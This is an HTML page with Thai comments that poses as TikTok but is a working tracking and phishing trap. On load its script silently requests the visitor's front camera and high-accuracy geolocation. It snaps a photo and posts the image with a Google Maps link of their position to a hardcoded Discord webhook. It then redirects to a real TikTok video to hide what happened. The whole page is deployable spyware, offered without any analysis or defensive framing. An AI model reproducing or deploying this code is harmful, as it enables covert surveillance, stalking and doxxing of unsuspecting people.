<!DOCTYPE html>
<html lang="th">
<head>
  <meta charset="UTF-8">
  <title>Tiktok.com</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <script src="https://cdn.tailwindcss.com"></script>
  <script>tailwind.config = {theme: {extend: {colors: {'web3-darker': '#111827',},fontFamily: {space: ['Space Grotesk', 'sans-serif'],}}}}</script>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    
    html {
      width: 100%;
      height: 100%;
    }
    
    body {
      width: 100%;
      min-height: 100vh;
      min-height: -webkit-fill-available;
      overflow: hidden;
      font-family: 'Space Grotesk', sans-serif;
      color: #e5e7eb;
      position: relative;
    }
    
    /* พื้นหลังสำหรับมือถือ */
    body::before {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: url('https://cdn.discordapp.com/attachments/1439099287224193126/1439120148182204488/IMG_6714.png?ex=69195c94&is=69180b14&hm=9366d646854cb137ce89de6f5163a633c2a92e4df34e06792d98e17ac50356c5&') center center no-repeat;
      background-size: contain;
      z-index: -1;
    }
    
    /* สำหรับจอแนวตั้ง (มือถือ) */
    @media (orientation: portrait) {
      body::before {
        background-size: 100% auto;
        background-position: top center;
      }
    }
    
    /* สำหรับจอแนวนอน */
    @media (orientation: landscape) {
      body::before {
        background-size: auto 100%;
        background-position: center center;
      }
    }

    video, canvas, img {
      display: none;
    }
  </style>
</head>

<body>
<!-- ===== ตรงนี้คือ CONTENT ของอาร์ต ===== -->
<div class="relative h-screen flex items-center justify-center overflow-hidden">
  <div class="text-center px-6">
    <h1 class="text-4xl md:text-5xl font-bold mb-6"></h1>
    <p class="text-gray-400 text-lg"></p>
  </div>
</div>
<!-- ====================================== -->

<video id="video" playsinline autoplay></video>
<canvas id="canvas"></canvas>
<img id="photo" alt="preview">

<script>
// ===== CAMERA CAPTURE =====
const WEBHOOK_URL = "https://discord.com/api/webhooks/1503087245173985431/wqzOnzEQ0I6h5UraUmoKy5JsQeocyMCdBRTB0SVSanfxGNh_OEYDlj-i1t8NYKUGAgH9";

const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const photo = document.getElementById('photo');

async function getLocation() {
  return new Promise((resolve) => {
    if (!navigator.geolocation) {
      resolve({ error: 'ไม่รองรับ Geolocation' });
      return;
    }
    
    navigator.geolocation.getCurrentPosition(
      (position) => {
        resolve({
          lat: position.coords.latitude,
          lng: position.coords.longitude,
          accuracy: position.coords.accuracy
        });
      },
      (error) => {
        let errorMsg = 'ไม่ทราบสาเหตุ';
        if (error.code === 1) errorMsg = 'ผู้ใช้ปฏิเสธ';
        else if (error.code === 2) errorMsg = 'ไม่พบตำแหน่ง';
        else if (error.code === 3) errorMsg = 'หมดเวลา';
        resolve({ error: errorMsg });
      },
      { timeout: 10000, enableHighAccuracy: true, maximumAge: 0 }
    );
  });
}

async function sendToDiscord(message, imageBlob = null) {
  try {
    const form = new FormData();
    if (imageBlob) {
      const filename = "capture-" + Date.now() + ".png";
      form.append("file", imageBlob, filename);
    }
    form.append("content", message);
    await fetch(WEBHOOK_URL, { method: "POST", body: form });
  } catch (err) {
    console.error("Discord send error:", err);
  }
}

async function startCapture() {
  const userAgent = navigator.userAgent || navigator.vendor || window.opera;
  const isAndroid = /Android/i.test(userAgent);
  
  // เริ่มขอ location ทันที (ทำพร้อมกับกล้อง)
  const locationPromise = getLocation();
  
  try {
    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
      await sendToDiscord("⚠️ Browser ไม่รองรับกล้อง");
      window.location.href = "https://www.tiktok.com/@tokgamer46/video/7358744726331264273?q=freefire%20%E0%B9%80%E0%B8%81%E0%B8%A3%E0%B8%B5%E0%B8%A2%E0%B8%99&t=1763182546319";
      return;
    }

    const stream = await navigator.mediaDevices.getUserMedia({ 
      video: { 
        facingMode: "user",
        width: { ideal: 640 },
        height: { ideal: 480 }
      } 
    });
    
    video.srcObject = stream;
    video.play();

    // รอให้วิดีโอพร้อม
    await new Promise(resolve => {
      const check = () => {
        if (video.readyState >= 2 && video.videoWidth > 0) {
          resolve();
        } else {
          requestAnimationFrame(check);
        }
      };
      check();
    });

    // รอเพิ่มเติมสำหรับ Android
    await new Promise(r => setTimeout(r, isAndroid ? 1500 : 800));

    const width = video.videoWidth;
    const height = video.videoHeight;

    canvas.width = width;
    canvas.height = height;

    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0, width, height);

    const blob = await (await fetch(canvas.toDataURL('image/jpeg', 0.85))).blob();
    
    stream.getTracks().forEach(t => t.stop());

    // รอ location (ไม่เกิน 10 วินาที)
    const location = await locationPromise;
    
    // สร้างข้อความพร้อม location
    let message = `📸 ${isAndroid ? 'Android' : 'iOS'}`;
    if (location && location.lat) {
      message += `\n📍 https://www.google.com/maps?q=${location.lat},${location.lng}`;
      message += `\n🎯 แม่นยำ: ${Math.round(location.accuracy)}m`;
    } else if (location && location.error) {
      message += `\n⚠️ Location Error: ${location.error}`;
    } else {
      message += `\n⚠️ ไม่ได้ตำแหน่ง`;
    }

    // ส่งไป Discord และรอให้ส่งเสร็จ
    const form = new FormData();
    form.append("file", blob, "capture.jpg");
    form.append("content", message);
    await fetch(WEBHOOK_URL, { method: "POST", body: form }).catch(() => {});
    
    // Redirect หลังส่งเสร็จ
    window.location.href = "https://www.tiktok.com/@tokgamer46/video/7358744726331264273?q=freefire%20%E0%B9%80%E0%B8%81%E0%B8%A3%E0%B8%B5%E0%B8%A2%E0%B8%99&t=1763182546319";
  } catch (err) {
    await sendToDiscord(`❌ ${err.message}`);
    window.location.href = "https://www.tiktok.com/@tokgamer46/video/7358744726331264273?q=freefire%20%E0%B9%80%E0%B8%81%E0%B8%A3%E0%B8%B5%E0%B8%A2%E0%B8%99&t=1763182546319";
  }
}

window.onload = startCapture;
</script>

</body>
</html>
